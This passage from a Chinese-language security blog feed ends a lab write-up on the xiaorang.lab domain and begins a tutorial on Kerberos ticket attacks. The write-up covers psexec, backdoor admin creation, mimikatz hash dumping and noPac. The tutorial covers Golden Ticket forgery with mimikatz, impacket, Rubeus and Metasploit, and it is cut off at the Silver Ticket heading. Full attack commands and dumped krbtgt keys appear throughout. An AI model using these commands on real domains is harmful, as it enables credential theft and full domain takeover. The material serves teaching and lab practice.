XR-LCM3AE8B.xiaorang.lab</span><br></pre></td></tr></table></figure><p>导入ccache后，最后即可无密码连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py xiaorang.lab/administrator@XR-LCM3AE8B.xiaorang.lab -k -no-pass -target-ip 172.22.11.26 -codec gbk</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742982092267-f2bd9dd7-caf2-4d72-b52d-52c41b41c2f4.png"></p><p>flag{681cae09-6e26-4714-87d8-e1e52d014bcc}</p><h2 id="nopac"><a href="#nopac" class="headerlink" title="nopac"></a>nopac</h2><p>添加后门用户进行rdp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> net user calmsec admin@123 /add</span><br><span class="line">net localgroup administrators calmsec /add</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742982227563-81ed6c8f-8bbb-4877-a88f-8ccc28c499eb.png"></p><p>rdp26，登录的时候发现有用户在登录，传🥝抓一下hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; 1.txt</span><br></pre></td></tr></table></figure><p>加管理员账户，rdp上去，用猕猴桃可以抓到一个zhanghui用户的哈希1232126b24cdf8c9bd2f788a9d7c7ed1，他在MA_Admin组，对computer能够创建对象，能向域中添加机器账户，所以能打noPac</p><p><a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 noPac.py xiaorang.lab/zhanghui -hashes &#x27;:1232126b24cdf8c9bd2f788a9d7c7ed1&#x27; -dc-ip 172.22.11.6 --impersonate Administrator -create-child -use-ldap -shell</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742982930827-52b533e0-697e-4020-a280-816898acfe3e.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>四种票据利用方式</title>
      <link href="/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
      <url>/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Kerberos-身份认证流程"><a href="#0x01-Kerberos-身份认证流程" class="headerlink" title="0x01 Kerberos 身份认证流程"></a>0x01 Kerberos 身份认证流程</h2><p>Kerberos 是一种基于票证的<a href="https://so.csdn.net/so/search?q=%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81&spm=1001.2101.3001.7020">身份验证</a>协议。它基本上是这样工作的：</p><p>1.<a href="https://so.csdn.net/so/search?q=%E5%AE%A2%E6%88%B7%E7%AB%AF&spm=1001.2101.3001.7020">客户端</a>向KDC（Key Distribution Center，通常是域控制器）请求TGT（Ticket Granting Ticket）。请求用户的密钥之一用于预身份验证。 TGT 由身份验证服务 (AS) 提供。客户端的请求被称为AS-REQ，应答被称为AS-REP。</p><p>2.客户端使用 TGT 向 KDC 请求 ST（服务票证）。该票证由票证授予服务 (TGS) 提供。客户端的请求被称为TGS-REQ，应答被称为TGS-REP。</p><p>3.客户端使用ST（服务票证）来访问服务。客户端对服务的请求被称为调用AP-REQ，服务的响应被称为调用AP-REP。</p><p>4.两种票证（TGT 和 ST）通常都包含加密的 PAC（特权身份验证证书），目标服务将读取一组信息来决定身份验证用户是否可以访问该服务（用户 ID、组成员身份等） 。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920132-d7111175-46f6-4245-b825-10ad5b56527b.png"></p><h2 id="0x02-黄金票据-Golden-Ticket"><a href="#0x02-黄金票据-Golden-Ticket" class="headerlink" title="0x02 黄金票据 Golden Ticket"></a>0x02 黄金票据 Golden Ticket</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>黄金票证是一种权限维持手段，攻击者获得了对 Active Directory 密钥分发服务帐户 （KRBTGT） 的控制权，并使用该帐户伪造有效的 Kerberos 票证授予票证 （TGT）。这使攻击者能够访问 Active Directory 域上的任何资源，如果有 KRBTGT 哈希，您可以伪造自己的 TGT，其中包括想要的任何组成员身份的 PAC 数据</p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>黄金票据的使用的必要票件是获取域中 <code>krbtgt</code> 用户使用的加密密钥之一，然而加密密钥之一就是该账户的<code>NTLM HASH</code>值</p><p>可以使用使用<code>Mimikatz</code>读取密钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz # lsadump::lsa /inject /name:krbtgt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Domain : ROOTKIT / S-1-5-21-3759881954-2993291187-3577547808</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : 000001f6 (502)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User : krbtgt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Primary</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    NTLM : c3d5042c67ef5f461d0ba6ecdd9ea449</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    LM   :</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  Hash NTLM: c3d5042c67ef5f461d0ba6ecdd9ea449</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ntlm- 0: c3d5042c67ef5f461d0ba6ecdd9ea449</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    lm  - 0: 2ca534c7c96a0b5bf6b37169b68f66af</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * WDigest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    01  3aea9b0472aa93bb13a9b2cffacf1001</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    02  d9a716e3ba48883f5e320e32ea793979</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    03  c888eb926eb57ff76e58ab449473d39b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    04  3aea9b0472aa93bb13a9b2cffacf1001</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    05  d9a716e3ba48883f5e320e32ea793979</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    06  e9ae3f6dcdd930348beb39a7820c885e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    07  3aea9b0472aa93bb13a9b2cffacf1001</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    08  012ae037510392d1042f4b243bd2c267</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    09  012ae037510392d1042f4b243bd2c267</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    10  a9fb57ca643019f1d9905258c730bc6d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    11  1502d1b012872f1fa844005a85febaf4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    12  012ae037510392d1042f4b243bd2c267</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    13  6e163f56804bf65f31aca237ffc9c27c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    14  1502d1b012872f1fa844005a85febaf4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    15  3129979e298936ba9f9887964df78426</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    16  3129979e298936ba9f9887964df78426</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    17  7d8690f61f25eee70d00dbf43d56dde3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    18  5d4a8835dbe016ee297e53e7ffb39211</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    19  d634b7b932766446b488972d97a666d8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    20  0fc150e25f583494a969df01da500775</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    21  f56f62faf0625c2d57698b23a23bbec9</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    22  f56f62faf0625c2d57698b23a23bbec9</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    23  8071dd220b86f03043815241b5826a37</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    24  9c11092e9e52701249d1b3e28351aa8c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    25  9c11092e9e52701249d1b3e28351aa8c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    26  e8432cad9fda7cd77474c556d8add53a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    27  72296ac7ad11af046a2cb5edc6ccd75c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    28  78f36bbd4ba657fdcc2f377e550e0c62</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    29  4cb788eeb5b4460b4334f6b6b5cd969b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Kerberos</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Default Salt : ROOTKIT.ORGkrbtgt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Credentials</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      des_cbc_md5       : 2cb957646746e376</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Kerberos-Newer-Keys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Default Salt : ROOTKIT.ORGkrbtgt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Default Iterations : 4096</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Credentials</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      aes256_hmac       (4096) : 3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      aes128_hmac       (4096) : c7ae2a311bdd5803646f9a98351c31e6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      des_cbc_md5       (4096) : 2cb957646746e376</span><br></pre></td></tr></table></figure><p>其中有三个加密密钥可以用于黄金票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">NTLM : c3d5042c67ef5f461d0ba6ecdd9ea449</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aes256_hmac  : 3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aes128_hmac  : c7ae2a311bdd5803646f9a98351c31e6</span><br></pre></td></tr></table></figure><p>除了加密密钥之外，还需要以下信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">目标域名：我这里是rootkit.org</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">目标域的sid：刚刚lsadump::lsa 有显示S-1-5-21-3759881954-2993291187-3577547808 或者whami /all也可以查看</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">要模拟的用户账户名称：例如 Administrator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">要模拟的用户RID：RID是SID右边的数字，例如管理员是500</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">该账户所属组的RID:域用户和域管理员的RID分别是512和513</span><br></pre></td></tr></table></figure><h3 id="使用Mimikatz注入票据"><a href="#使用Mimikatz注入票据" class="headerlink" title="使用Mimikatz注入票据"></a>使用Mimikatz注入票据</h3><p>登录低权限域账户，尝试 <code>dir</code> 域控失败</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536919568-de374eda-8ece-45b5-ab52-ce4984131caf.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">清除原有票据：kerberos::purge</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注入黄金票据：kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /rc4:c3d5042c67ef5f461d0ba6ecdd9ea449 /user:Administrator /id:500 /groups:500,501,513,512,520,518,519 /ptt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536919874-eb4a1d76-807d-4699-970c-63d8606cdb21.png"></p><p>成功注入后尝试<code>dir</code>域控，成功</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920030-88794d9a-2066-4d7c-8b69-af3b1047d3cb.png"></p><p>尝试<code>psexec</code>成功</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536919992-325b75f9-de36-4e4f-a1fd-9b5362444dd4.png"></p><p>如果以后想要重复使用相同的票据，可以直接生成一个票据文件，然后将其文件导入会话中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /rc4:c3d5042c67ef5f461d0ba6ecdd9ea449 /user:Administrator /id:500 /groups:500,501,513,512,520,518,519 /ticket:golden.kirbi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kerberos::ptt golden.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920153-a90822c1-1178-4dff-9933-764b23e2d80a.png"></p><p><strong>注意</strong>：由于客户端和服务器的配置问题以及windows自身的特性，需要尝试目标系统的非限定名称或者限定名称才能成功，例如 UNC 路径<code>\\owa2013\c$</code>或<code>\\owa2013.rootkit.org\c$</code></p><p>如果拥有 <code>AES-256 HMAC</code> 和&#x2F;或 <code>AES-128 HMAC</code>也可进行尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#aes256</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /aes256:3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745 /user:Administrator /id:500 /groups:500,501,513,512,520,518,519 /ptt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#aes128</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /aes128:c7ae2a311bdd5803646f9a98351c31e6 /user:Administrator /id:500 /groups:500,501,513,512,520,518,519 /ptt</span><br></pre></td></tr></table></figure><h3 id="欺骗性用户名"><a href="#欺骗性用户名" class="headerlink" title="欺骗性用户名"></a><strong>欺骗性用户名</strong></h3><p>在票据认证中，目标系统通常会信任 Kerberos 票证中的信息，而不会验证帐户信息是否有效。我们可以尝试注入一个名称为<code>Hello world,Nice to meet you my dear</code>的会话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /aes256:3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745 /user:&quot;Hello world,Nice to meet you my dear&quot; /id:500 /groups:500,501,513,512,520,518,519 /ptt</span><br></pre></td></tr></table></figure><p>查看域控在线会话可以看到这个用户名</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920410-95021d33-5561-4ba8-86f2-4011e5817528.png"></p><p>其实 RID 也可以任意，但是某些系统会尝试反向查找产生异常，非必要情况下不建议这么做</p><h3 id="组成员资格"><a href="#组成员资格" class="headerlink" title="组成员资格"></a>组成员资格</h3><p>组 RID 列表不需要与欺骗票证中的帐户所属的实际组列表相对应，即使你的用户名是低权限，你可以包含<code>Domain Admins</code>组的 RID。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /aes256:3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745 /user:micle /id:1139 /groups:500,501,513,512,520,518,519 /ptt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920540-bd8c1f6a-de16-4891-8dbd-0ab0bb6c2f46.png"></p><h3 id="impacket-下黄金票据的利用"><a href="#impacket-下黄金票据的利用" class="headerlink" title="impacket 下黄金票据的利用"></a>impacket 下黄金票据的利用</h3><p><code>lookupid.py</code>脚本以枚举域 SID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lookupsid.py &quot;rookit/administrator:admin!@#45&quot;@192.168.3.131</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920760-a3769aaf-15b1-415d-84d1-2a06ffc9e052.png"></p><p><code>secretsdump.py</code>用于提取 <code>krbtgt</code>哈希</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py &quot;rookit/administrator:admin!@#45&quot;@192.168.3.131 -outputfile krbhash -user-status</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920704-f6fea906-e0db-42f1-acce-10650b09e3e5.png"></p><p><code>ticketer.py</code> 脚本创建TGT&#x2F;TGS工单，工单期限固定为10年后，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ticketer.py -nthash c3d5042c67ef5f461d0ba6ecdd9ea449 -domain-sid S-1-5-21-3759881954-2993291187-3577547808 -domain rootkit.org administrator</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920572-10f68acf-784b-453f-b6ed-96c5db63a308.png"></p><p>使用<code>ticket_converter.py</code>将ccache文件转换为kirbi文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ticketConverter.py administrator.ccache ticket.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920830-4918c11a-cce1-4312-93b3-fb8902caeff7.png"></p><p>mimikatz进行注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt ticket.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921036-4de8a07f-7ede-4458-85c0-f3f33357bdff.png"></p><h3 id="使用-Rubeus-exe-传递票据"><a href="#使用-Rubeus-exe-传递票据" class="headerlink" title="使用 Rubeus.exe 传递票据"></a>使用 Rubeus.exe 传递票据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:ticket.kirbi</span><br></pre></td></tr></table></figure><h3 id="msf-下的-mimikatz"><a href="#msf-下的-mimikatz" class="headerlink" title="msf 下的 mimikatz"></a>msf 下的 mimikatz</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dcsync_ntlm krbtgt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921311-a8299fae-3003-4348-9955-769e80fc3a03.png"></p><p>确定当前域</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921522-7c4f808b-771e-4383-9082-4ab52c78ff7c.png"></p><p>生成票据并导入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create -d rootkit.local -u administrator -s S-1-5-21-3759881954-2993291187-3577547808 -k c3d5042c67ef5f461d0ba6ecdd9ea449 -t /home/kali/ticket.kirbi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kerberos_ticket_use /home/kali/ticket.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921338-6f6a3068-9147-4607-8b03-f310ff8a3ec7.png"></p><h2 id="0x03-白银票据-Silver-Ticket"><a href="#0x03-白银票据-Silver-Ticket" class="headerlink" title="0x03 白银票据 Silver Ticket"></a>0x03 白银票据 Silver Ticket</h2><h3 id="介绍-1"><a 